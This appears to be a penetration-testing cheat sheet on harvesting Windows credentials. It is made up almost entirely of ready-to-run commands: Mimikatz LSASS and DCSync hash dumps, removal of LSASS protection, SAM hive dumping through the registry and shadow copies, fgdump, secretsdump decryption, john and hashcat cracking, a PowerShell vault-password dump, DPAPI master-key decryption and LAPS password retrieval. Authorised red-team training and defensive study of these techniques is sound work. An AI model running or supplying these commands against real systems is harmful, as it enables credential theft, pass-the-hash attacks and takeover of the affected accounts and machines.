# Credentials harvesting

## Enumerate Users And Hashes

```
privilege::debug
token::elevate

lsadump::lsa /inject /name:<user>    //NTLM hash of user
lsadump::dcsync /user:krbtgt         //Hashes of specified user

sekurlsa::logonpasswords //NTLM and SHA1 hashes
sekurlsa::credman        //vault credentials
sekurlsa::ekeys /aes128
sekurlsa::ekeys /aes256

vault::cred    //vault credentials
vault::list    //credman plaintext passwords
```

if the logonpassword command returns an error `Handle on memory (0x00000005)` use the following commands in Mimikatz to disable LSASS protection

```
!+
!processprotect /process:lsass.exe /remove
```

## NTLM From Password

```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

## SAM

### Dumping

#### Manual

Administrative privileges are required to dump register keys

```
reg.exe save hklm\sam c:\dp\sam.save
reg.exe save hklm\system c:\dp\system.save
reg.exe save hklm\security c:\dp\security.save
```

Possible backups location

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

#### ShadowCopy Exploit

It is possible to retrieve and dump keys from old backup versions of the system saved with ShadowCopy. Once the backup version is exposed you can dump the SAM credentials and extract  DPAPI hashes. All the following operations require Admin privileges

Enumerate existing copies

```
vssadmin list shadows
```

Create a new shadowCopy archive

```
wmic shadowcopy call create Volume='C:\'
```

Create a link to the copy

<pre><code><strong>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\&#x3C;shadow copy volume name>\
</strong></code></pre>

IF you're unable to navigate the link due to access permission errors It is still possible to extract files from the shadow copy

```
copy \\?\GLOBALROOT\Device\<shadow copy vol>\windows\system32\config\sam <dest>\sam
copy \\?\GLOBALROOT\Device\<shadow copy vol>\windows\system32\config\system <dest>\system
```

#### fgdump.exe

Runs locally, creates a file with the hashes.

```
fgdump.exe
fgdump.exe -t    #test for anti-virus presence
fgdump.exe -a    #don't try to disable anti-virus
fgdump.exe -r    #ignore existing dump files
```

#### Mimikatz

```
lsadump::sam                 //SAM database
lsadump::secrets             //SAM secrets
```

### Decryption

Impacket - secretsdump.py

<pre><code>secretsdump.py -sam &#x3C;sam file> -system &#x3C;system file> LOCAL
<strong>secretsdump.py -sam &#x3C;sam file> -system &#x3C;system file> -security &#x3C;sec file> LOCAL
</strong></code></pre>

Samdump or Pwdump

```
samdump2 system.save sam.save
pwdump SYSTEM SAM > <file>
```

After obtaining the hashes they can be cracked to obtain the passwords or used in Pass the Hash attacks. In order to obtain the passwords we need only the NT part of the hash. given an hash with the following structure `AAAA:BBBB` the actual string to bruteforce is the one to the right of the column

```
john -format=NT -wordlist=<wordlist> <hashfile>
hashcat -m 1000 -a 0 --force --show --username <hash> <wordlist> #rows follow the format <user>:<hash>
```

## Vault credentials dump

Enumerate credentials manager entries

```
vaultcmd /list
VaultCmd /listcreds:"<entry name>"
```

Dump credentials associated with the vault entry

```
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
```

## DPAPI

Usual credential files position

```
%appdata%\Microsoft\Credentials\
%localappdata%\Microsoft\Credentials\
%appdata%\Microsoft\Protect\<usersid>\    //master key
```

Enumerate Credentials hashes. The parameter `guidMasterKey` reveals the hash of the master key

```
dpapi::cred /in:"<path to cred hash>" 
```

Retrieve the master key, decode it and store the key in cache. In order to decrypt the key we need to be operating under the same context (user, system) the key belongs to.&#x20;

```
dpapi::masterkey /in:"<Path to MasterKeyGUID>" 
dpapi::masterkey /in:"<Path to MasterKeyGUID>" /rpc
dpapi::cache
```

Decrypt other hashes with the master key

```
dpapi::cred /in:"<path to CredHash>"
```

## LAPS

Verify that LAPS is installed by searching for `admpwd.dll` usually in `C:\Program Files\LAPS\CSE`

Check available commands in PowerShell

```
Get-Command *AdmPwd*
```

Find groups allowed to interact with LAPS

```
Find-AdmPwdExtendedRights -Identity *
Find-AdmPwdExtendedRights -Identity <user>
```

Get users of the detected group

```
net groups "<group>"
```

Run the following command in the context of a user part of the  group allowed to interact with LAPS to dump the stored passwords. The target is the machine with LAPS enabled

```
Get-AdmPwdPassword -ComputerName <target>
```
